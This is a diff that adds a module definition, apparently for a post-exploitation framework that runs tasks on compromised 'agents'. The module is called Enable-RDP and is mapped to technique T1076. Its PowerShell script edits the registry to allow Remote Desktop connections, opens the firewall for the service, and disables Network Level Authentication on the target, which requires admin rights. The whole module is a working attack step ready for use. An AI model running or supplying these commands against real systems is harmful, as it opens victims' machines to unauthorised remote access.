@@ -1,0 +1,25 @@
+name: Enable-RDP
+authors:
+  - '@harmj0y'
+description: Enables RDP on the remote machine and adds a firewall exception.
+software: ''
+techniques:
+  - T1076
+background: false
+output_extension:
+needs_admin: true
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments: [ ]
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+script: |
+  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f;
+  if($?) {$null = netsh firewall set service type = remotedesktop mod = enable;
+    $null = reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f }
+  "`n Enable-RDP completed!"
+script_end: ''
